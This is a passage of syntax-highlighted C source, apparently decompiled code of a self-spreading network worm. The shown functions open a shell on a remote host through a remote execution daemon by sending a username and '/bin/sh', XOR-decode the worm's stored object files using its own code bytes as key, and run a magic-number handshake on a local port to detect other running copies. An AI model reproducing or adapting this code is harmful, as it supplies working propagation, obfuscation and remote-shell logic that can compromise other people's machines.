    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">""</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc1">/* Tell the remote execution deamon the hostname, username, and to star
tup
       "/bin/sh". */</span><span class="sc0">
    </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">name1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">name1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">name2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">name2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"/bin/sh"</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"/bin/sh"</span><span class="sc10">))+</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0">
        </span><span class="sc11">xread</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">in_buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">20</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc0">  </span><span class="sc10">&amp;&amp;</span><span class="sc0">
        </span><span class="sc11">in_buf</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'\0'</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0">
        </span><span class="sc11">test_connection</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">40</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Reads in a file and puts it in the 'objects' array.  Returns 1 if sucessful
,
 * 0 if not. */</span><span class="sc0">
</span><span class="sc11">loadobject</span><span class="sc10">(</span><span class="sc11">obj_name</span><span class="sc10">)</span><span class="sc0">                </span><span class="sc1">/* x5594 */</span><span class="sc0">
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">obj_name</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">stat</span><span class="sc0"> </span><span class="sc11">statbuf</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">object_buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">suffix</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">local</span><span class="sc10">[</span><span class="sc4">4</span><span class="sc10">];</span><span class="sc0">
    
    </span><span class="sc11">fd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">open</span><span class="sc10">(</span><span class="sc11">obj_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">O_RDONLY</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc1">/* 378 */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fstat</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">statbuf</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">size</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">statbuf</span><span class="sc10">.</span><span class="sc11">st_size</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">object_buf</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc11">size</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">object_buf</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">object_buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">free</span><span class="sc10">(</span><span class="sc11">object_buf</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">xorbuf</span><span class="sc10">(</span><span class="sc11">object_buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">suffix</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">index</span><span class="sc10">(</span><span class="sc11">obj_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">','</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">suffix</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc11">suffix</span><span class="sc10">+=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">else</span><span class="sc0">
    </span><span class="sc11">suffix</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">obj_name</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">objects</span><span class="sc10">[</span><span class="sc11">nobjects</span><span class="sc10">].</span><span class="sc11">name</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">suffix</span><span class="sc10">)+</span><span class="sc4">1</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">suffix</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">objects</span><span class="sc10">[</span><span class="sc11">nobjects</span><span class="sc10">].</span><span class="sc11">size</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">objects</span><span class="sc10">[</span><span class="sc11">nobjects</span><span class="sc10">].</span><span class="sc11">buf</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">object_buf</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">nobjects</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Returns the object from the 'objects' array that has name, otherwise NULL. 
*/</span><span class="sc0">
</span><span class="sc11">object</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">getobjectbyname</span><span class="sc10">(</span><span class="sc11">name</span><span class="sc10">)</span><span class="sc0">
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">name</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">nobjects</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strcmp</span><span class="sc10">(</span><span class="sc11">name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">objects</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">name</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">objects</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Encodes and decodes the binary coming over the socket. */</span><span class="sc0">
</span><span class="sc11">xorbuf</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">)</span><span class="sc0">               </span><span class="sc1">/* 0x577e */</span><span class="sc0">
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">buf</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">addr_self</span><span class="sc10">;</span><span class="sc0">            </span><span class="sc1">/* The address of the xorbuf fuction */</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc11">addr_self</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">xorbuf</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> 
    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">size</span><span class="sc10">--</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc10">*</span><span class="sc11">buf</span><span class="sc10">++</span><span class="sc0"> </span><span class="sc10">^=</span><span class="sc0"> </span><span class="sc11">addr_self</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">other_fd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* Make a connection to the local machine and see if I'm running in
   another process by sending a magic number on a random port and waiting
   five minutes for a reply. */</span><span class="sc0">
</span><span class="sc11">checkother</span><span class="sc10">()</span><span class="sc0">                    </span><span class="sc1">/* 0x57d0 */</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l12</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l16</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">optval</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc11">sin</span><span class="sc10">;</span><span class="sc0">         </span><span class="sc1">/* 16 bytes */</span><span class="sc0">
    
    </span><span class="sc11">optval</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">random</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">7</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">                 </span><span class="sc1">/* 612 */</span><span class="sc0">
    
    </span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">socket</span><span class="sc10">(</span><span class="sc11">AF_INET</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SOCK_STREAM</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc1">/* Make a socket to the localhost, using a link-time specific port */</span><span class="sc0">
    </span><span class="sc11">bzero</span><span class="sc10">(&amp;</span><span class="sc11">sin</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sin</span><span class="sc10">));</span><span class="sc0">       </span><span class="sc1">/* 16 */</span><span class="sc0">
    </span><span class="sc11">sin</span><span class="sc10">.</span><span class="sc11">sin_family</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">AF_INET</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">sin</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">.</span><span class="sc11">s_addr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">inet_addr</span><span class="sc10">(</span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"127.0.0.1"</span><span class="sc10">));</span><span class="sc0"> </span><span class="sc1">/* &lt;other_fd+4&gt; */</span><span class="sc0">
    </span><span class="sc11">sin</span><span class="sc10">.</span><span class="sc11">sin_port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x00005b3d</span><span class="sc10">;</span><span class="sc0">          </span><span class="sc1">/* ??? */</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">connect</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">sin</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sin</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">l8</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">MAGIC_2</span><span class="sc10">;</span><span class="sc0">           </span><span class="sc1">/* Magic number??? */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">l8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">l8</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">l8</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">l8</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xread</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">l8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">l8</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc10">*</span><span class="sc4">60</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">l8</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">l8</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">MAGIC_1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    
    </span><span class="sc11">l12</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">random</span><span class="sc10">()/</span><span class="sc4">8</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">l12</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">l12</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">l12</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xread</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">l16</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">l16</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">l16</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!((</span><span class="sc11">l12</span><span class="sc10">+</span><span class="sc11">l16</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc11">pleasequit</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">sleep</span><span class="sc10">(</span><span class="sc4">5</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">socket</span><span class="sc10">(</span><span class="sc11">AF_INET</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SOCK_STREAM</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc1">/* Set the socket so that the address may be reused */</span><span class="sc0">
    </span><span class="sc11">setsockopt</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SOL_SOCKET</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SO_REUSEADDR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">optval</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">optval</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bind</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">sin</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sin</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">listen</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc11">other_fd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Sleep, waiting for another worm to contact me. */</span><span class="sc0">
</span><span class="sc11">other_sleep</span><span class="sc10">(</span><span class="sc11">how_long</span><span class="sc10">)</span><span class="sc0">               </span><span class="sc1">/* 0x5a38 */</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nfds</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">readmask</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">time1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">time2</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">timeval</span><span class="sc0"> </span><span class="sc11">timeout</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">other_fd</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">how_long</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">sleep</span><span class="sc10">(</span><span class="sc11">how_long</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc1">/* Check once again.. */</span><span class="sc0">
    </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">other_fd</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">readmask</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc11">other_fd</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">how_long</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
